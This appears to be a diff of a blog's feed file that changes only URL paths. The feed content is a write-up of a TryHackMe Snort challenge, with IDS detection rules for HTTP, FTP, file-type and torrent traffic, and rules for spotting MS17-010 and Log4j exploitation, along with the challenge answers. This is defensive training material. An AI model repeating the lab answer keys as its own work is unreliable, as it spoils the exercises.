 &lt;h3 id="task-4-enumeration"&gt;Task 4 - Enumeration&lt;/h3&gt;
 &lt;p&gt;The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following:&lt;/p&gt;
 &lt;ul&gt;
@@ -431,15 +431,15 @@ the rest is garbage
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;ihopeyoudidthisonwindows &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 </content>
 		<summary>&lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;</summary>
 	</entry>
 	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-06-02-tryhackme-snort-challenges-1</id>
+		<id>https://blog.mark-burton.com/posts/2023-06-02-tryhackme-snort-challenges-1</id>
 		<title>Try Hack Me - Snort Challenges - The Basics</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-06-02-tryhackme-snort-challenges-1" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
+		<link href="https://blog.mark-burton.com/posts/2023-06-02-tryhackme-snort-challenges-1" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/assets/Images/snort.png" />
 		<updated>2023-06-02T15:23:12Z</updated>
 		<content>&lt;h2 id="snort-challenge-the-basics"&gt;Snort Challenge - The Basics&lt;/h2&gt;
 &lt;p&gt;This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.&lt;/p&gt;
@@ -548,7 +548,7 @@ alert tcp any any &amp;lt;&amp;gt; any 80 (msg: "port 80 destination"; sid: 1000
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;328 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;Investigate the log file.&lt;/p&gt;
 &lt;p&gt;What is the destination address of packet 63?&lt;/p&gt;
@@ -564,7 +564,7 @@ alert tcp any any &amp;lt;&amp;gt; any 80 (msg: "port 80 destination"; sid: 1000
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;145.254.160.237 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;Investigate the log file.&lt;/p&gt;
 &lt;p&gt;What is the ACK number of packet 64?&lt;/p&gt;
@@ -581,7 +581,7 @@ TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;0x38AFFFF3 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;Investigate the log file.&lt;/p&gt;
 &lt;p&gt;What is the SEQ number of packet 62?&lt;/p&gt;
@@ -596,7 +596,7 @@ TCP TTL:128 TOS:0x0 ID:3910 IpLen:20 DgmLen:40 DF
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;0x38AFFFF3 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;Investigate the log file.&lt;/p&gt;
 &lt;p&gt;What is the TTL number of packet 65?&lt;/p&gt;
@@ -612,7 +612,7 @@ TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;128 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-6"&gt;Question 6&lt;/h4&gt;
 &lt;p&gt;Investigate the log file.&lt;/p&gt;
 &lt;p&gt;What is the source IP number of packet 65?&lt;/p&gt;
@@ -627,7 +627,7 @@ TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;145.254.160.237 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-7"&gt;Question 7&lt;/h4&gt;
 &lt;p&gt;Investigate the log file.&lt;/p&gt;
 &lt;p&gt;What is the source port of packet 65?&lt;/p&gt;
@@ -642,7 +642,7 @@ TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;3372 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-3-writing-ids-rules-ftp"&gt;Task 3 - Writing IDS Rules (FTP)&lt;/h3&gt;
 &lt;p&gt;Let's create IDS Rules for FTP traffic!
 Answer the questions below
@@ -660,7 +660,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; sid: 1000
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;614 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-1"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;Investigate the log file.&lt;/p&gt;
 &lt;p&gt;What is the FTP service name?&lt;/p&gt;
@@ -668,7 +668,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; sid: 1000
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Microsoft FTP Service &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3-1"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Deactivate/comment on the old rules.&lt;/p&gt;
@@ -693,7 +693,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;41 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4-1"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
@@ -710,7 +710,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;1 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5-1"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
@@ -727,7 +727,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;42 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-6-1"&gt;Question 6&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
@@ -747,7 +747,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;7 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-3-writing-ids-rules-png"&gt;Task 3 - Writing IDS Rules (PNG)&lt;/h3&gt;
 &lt;p&gt;Let's create IDS Rules for PNG files in the traffic!&lt;/p&gt;
 &lt;h4 id="question-1-2"&gt;Question 1&lt;/h4&gt;
@@ -770,7 +770,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;adobe imageready &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-2"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Deactivate/comment on the old rule.&lt;/p&gt;
@@ -788,7 +788,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;GIF89a &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-5-writing-ids-rules-torrent-metafile"&gt;Task 5 - Writing IDS Rules (Torrent Metafile)&lt;/h3&gt;
 &lt;p&gt;Let's create IDS Rules for torrent metafiles in the traffic!&lt;/p&gt;
 &lt;h4 id="question-1-3"&gt;Question 1&lt;/h4&gt;
@@ -806,7 +806,7 @@ alert tcp any any &amp;lt;&amp;gt; any 21 (msg: "port 21 destination"; content:"
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;2 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-3"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;What is the name of the torrent application?&lt;/p&gt;
@@ -825,7 +825,7 @@ Connection: Keep-Alive
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;bittorrent &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3-2"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?&lt;/p&gt;
@@ -844,7 +844,7 @@ Connection: Keep-Alive
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;application/x-bittorrent &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4-2"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;What is the hostname of the torrent metafile?&lt;/p&gt;
@@ -863,7 +863,7 @@ Connection: Keep-Alive
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;tracker2.torrentbox.com &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-6-troubleshooting-rule-syntax-errors"&gt;Task 6 - Troubleshooting Rule Syntax Errors&lt;/h3&gt;
 &lt;p&gt;Let's troubleshoot rule syntax errors!&lt;/p&gt;
 &lt;p&gt;In this section, you need to fix the syntax errors in the given rule files.&lt;/p&gt;
@@ -890,7 +890,7 @@ ERROR: local-1.rules(8) ***Rule--PortVar Parse error: (pos=1,error=not a number)
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;16 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-4"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;Fix the syntax error in local-2.rules file and make it work smoothly.&lt;/p&gt;
 &lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
@@ -910,7 +910,7 @@ Fatal Error, Quitting..
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;68 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3-3"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;Fix the syntax error in local-3.rules file and make it work smoothly.&lt;/p&gt;
 &lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
@@ -932,7 +932,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000002; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;87 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4-3"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;Fix the syntax error in local-4.rules file and make it work smoothly.&lt;/p&gt;
 &lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
@@ -954,7 +954,7 @@ alert tcp any 80,443 -&amp;gt; any any (msg: "HTTPX Packet Found"; sid:1000001; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;90 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5-2"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;Fix the syntax error in local-4.rules file and make it work smoothly.&lt;/p&gt;
 &lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
@@ -978,7 +978,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;155 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-6-2"&gt;Question 6&lt;/h4&gt;
 &lt;p&gt;Fix the logical error in local-6.rules file and make it work smoothly to create alerts.&lt;/p&gt;
 &lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
@@ -1001,7 +1001,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;2 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-7-1"&gt;Question 7&lt;/h4&gt;
 &lt;p&gt;Fix the logical error in local-7.rules file and make it work smoothly to create alerts.&lt;/p&gt;
 &lt;p&gt;What is the name of the required option:&lt;/p&gt;
@@ -1020,7 +1020,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;msg &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-7-using-external-rules-ms17-010"&gt;Task 7 - Using External Rules (MS17-010)&lt;/h3&gt;
 &lt;p&gt;Let's use external rules to fight against the latest threats!&lt;/p&gt;
 &lt;p&gt;Use the given pcap file.&lt;/p&gt;
@@ -1031,7 +1031,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;25154 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-5"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.&lt;/p&gt;
@@ -1044,7 +1044,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;12 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3-4"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;What is the requested path?&lt;/p&gt;
@@ -1056,7 +1056,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;smb\192.168.116.138\IPC$ &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4-4"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;What is the CVSS v2 score of the MS17-010 vulnerability?&lt;/p&gt;
 &lt;h5 id="notes-21"&gt;Notes&lt;/h5&gt;
@@ -1065,7 +1065,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;9.3 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h3 id="task-8-using-external-rules-log4j"&gt;Task 8 - Using External Rules (Log4j)&lt;/h3&gt;
 &lt;p&gt;Let's use external rules to fight against the latest threats!&lt;/p&gt;
 &lt;p&gt;Use the given pcap file.&lt;/p&gt;
@@ -1076,7 +1076,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;26 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-2-6"&gt;Question 2&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;How many rules were triggered?.&lt;/p&gt;
@@ -1084,7 +1084,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;4 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-3-5"&gt;Question 3&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;What are the first six digits of the triggered rule sids?&lt;/p&gt;
@@ -1092,7 +1092,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;210037 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-4-5"&gt;Question 4&lt;/h4&gt;
 &lt;p&gt;Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.&lt;/p&gt;
 &lt;p&gt;What is the number of detected packets?&lt;/p&gt;
@@ -1109,7 +1109,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;41 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-5-3"&gt;Question 5&lt;/h4&gt;
 &lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
 &lt;p&gt;What is the name of the used encoding algorithm?&lt;/p&gt;
@@ -1122,7 +1122,7 @@ alert tcp any any -&amp;gt; any 80,443 (msg: "HTTPX Packet Found"; sid:1000003; 
 &lt;blockquote&gt;
 &lt;p class="answer blur"&gt;Base64 &lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
+&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 &lt;h4 id="question-6-3"&gt;Question 6&lt;/h4&gt;
